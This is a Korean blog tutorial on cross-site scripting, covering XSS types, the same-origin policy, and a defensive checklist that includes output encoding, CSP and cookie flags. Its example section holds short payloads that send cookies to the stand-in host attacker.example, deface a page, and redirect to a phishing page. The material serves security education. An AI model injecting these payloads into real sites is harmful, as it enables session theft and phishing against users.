---
title: "[Infosec] Cross-Site Scripting (XSS) 완전 정리"
date: 2025-09-10 20:10:00 +0900
categories: [보안, Web]   # 카테고리는 여러 계층도 가능 [상위, 하위]
tags: [웹해킹, XSS]          # 해시태그처럼 글 묶기
description: "인증정보 탈취 작전"
author: "송지민"
toc: true
---

# 가장 단순하지만 여전히 강력한 웹 공격 수단

---

> 이 글은 **보안 학습/방어 목적**입니다. 실습은 **본인 로컬/테스트 환경**에서만 하세요.

## XSS란?

**XSS(Cross-Site Scripting)** 는 웹 페이지에 악성 스크립트(보통 JavaScript)가 주입되어 **피해자의 브라우저에서 실행**되는 취약점이다.  
주로 “사용자가 입력한 값을 다시 출력”하는 기능에서 발생한다. (예: 로그인 후 “안녕하세요, 00님”)  

**SOP(Same-Origin Policy)** 때문에 임의의 출처의 민감한 데이터는 바로 읽기 어렵지만,  
스크립트가 **피해 사이트의 Origin 권한**으로 실행되기 때문에 **그 Origin의 권한 범위 안에서는 강력**하다.  
(예: 해당 사이트의 쿠키 접근, DOM 변조, 사용자의 클릭 유도 등)

---

## 언제 생기나? (간단 원리)

1. **입력(Input)**: 댓글/검색어/프로필 등 사용자가 넣는 값  
2. **처리(Process)**: 서버 또는 클라이언트(JS)에서 값 가공  
3. **출력(Output)**: HTML/속성/URL/스크립트 등 **맥락(Context)** 에 그대로 넣어 렌더링  
4. **실행(Execute)**: 브라우저가 그 값을 **코드로 해석**하면 XSS 발생

> 특히 **출력 맥락**(HTML 본문, 속성, JavaScript literal, URL, 스타일 등)에 맞는 **인코딩**이 안 되면 취약해진다.

---

## XSS 종류

| 종류 | 설명 |
|---|---|
| **Stored XSS** | 악성 스크립트가 **서버에 저장**되고, 다른 사용자가 페이지를 열 때 **응답에 포함**되어 실행됨. (예: 댓글/게시글에 삽입) |
| **Reflected XSS** | 악성 입력이 **요청 파라미터**에 들어오고, 서버가 그대로 **응답에 반사**해서 실행됨. (예: 검색 결과 페이지) |
| **DOM-based XSS** | 서버 응답이 아니라, **브라우저 내 JS가 DOM을 조작**하면서 발생. (예: `location.hash` 등을 `innerHTML`에 삽입) |
| **Universal XSS(UXSS)** | **브라우저/플러그인 자체**의 취약점으로 SOP를 우회해 스크립트가 실행되는 케이스. (앱·엔진 취약점 이슈) |

---

## 예제 코드 (학습용 / 안전 도메인 사용)

> 예제의 외부 주소는 **테스트 전용 도메인**으로 바꿨다: `https://attacker.example`  
> (※ `.example` TLD는 문서/예시에 쓰라고 예약된 도메인)

### 1) 쿠키/세션 탈취 시도 (학습용)
```html
<script>
// 데모: 현재 페이지의 쿠키 확인
alert(document.cookie);

// 단순 exfiltration 패턴 (이미지 요청으로 전송)
new Image().src = "https://attacker.example/collect?cookie=" + encodeURIComponent(document.cookie);
</script>
```
> 방어 팁: **HttpOnly 쿠키**면 `document.cookie`로 읽히지 않는다. `Secure`, `SameSite`도 함께 설정.

### 2) 페이지 변조
```html
<script>
// DOM 변조 (예: 내용 바꾸기)
document.write("Hacked by Demo!"); // 실제 서비스에선 미사용 권장
</script>
```
> 방어 팁: `document.write`, `innerHTML` 대신 **`textContent` / 안전한 템플릿** 사용.

### 3) 위치 이동(피싱 유도)
```html
<script>
// 피싱 페이지로 이동 (새 창 열기 포함)
location.href = "https://attacker.example/phishing";
window.open("https://attacker.example/");
</script>
```
> 방어 팁: 외부 링크는 **rel="noopener noreferrer"**, 사용자 확인(예: 중간 경고), URL 화이트리스트 등.

---

## SOP와 XSS의 관계, 그리고 왜 위험한가

- **SOP**는 “다른 출처의 응답 **읽기**”를 막는다.  
- 그러나 XSS는 **현재 페이지의 출처 권한**으로 실행되기 때문에, 그 **출처의 쿠키/DOM/요청**에는 접근 가능하다.  
- 그래서 공격자는 `https://attacker.example`로 **요청을 보내는 방식**(이미지/fetch 등)으로 데이터를 외부로 **유출**한다.

---

## 방어 전략 (현업 체크리스트)

### 1) 출력 인코딩(Output Encoding)
- 맥락별로 맞춤 인코딩:  
  - **HTML 본문** → HTML 엔코딩  
  - **HTML 속성** → 속성 엔코딩  
  - **URL/쿼리** → URL 엔코딩  
  - **JS literal** → JS 문자열 이스케이프  
- 프레임워크의 **기본 자동 이스케이프**를 끄지 말 것.

### 2) 입력 검증(Input Validation)
- 허용 목록(Whitelist) 기준으로 길이/문자/패턴 제한
- HTML을 허용해야 한다면 **DOMPurify** 같은 **화이트리스트 기반 Sanitizer** 사용

### 3) 안전한 DOM API 사용
- `innerHTML`, `document.write` 지양 → **`textContent`, `setAttribute`** 등 사용
- 사용자 입력을 **스크립트/이벤트 핸들러 속성**에 절대 직접 연결하지 말 것

### 4) 쿠키 보안
- **HttpOnly**: JS에서 쿠키 접근 차단  
- **Secure**: HTTPS에서만 전송  
- **SameSite**: 크로스 사이트 쿠키 전송 제한 (CSRF/XSS 조합 공격 완화)

### 5) **CSP(Content Security Policy)**
- 기본 정책: `script-src 'self'` + **nonce/sha256 기반** 인라인 허용  
- 단계적 도입: `Content-Security-Policy-Report-Only`로 **로그부터** 수집  
- **Trusted Types**(지원 브라우저): DOM XSS를 구조적으로 차단

### 6) 기타
- 템플릿 엔진의 **자동 escaping** 유지  
- 서드파티 스크립트 최소화/무결성(`integrity` 속성)  
- SRI, Subresource Integrity 적용  
- 린트/테스트(정적 분석, 동적 스캐너)로 **릴리즈 전 자동 점검**

---

## 요약

- XSS는 “**사용자 입력이 코드로 해석**되는 순간” 발생한다.  
- **Stored / Reflected / DOM-based / UXSS** 네 가지 관점으로 이해할 것.  
- 방어의 핵심은 **맥락별 인코딩**, **안전한 DOM 사용**, **CSP + HttpOnly/SameSite 쿠키**, **입력 검증/정화**다.
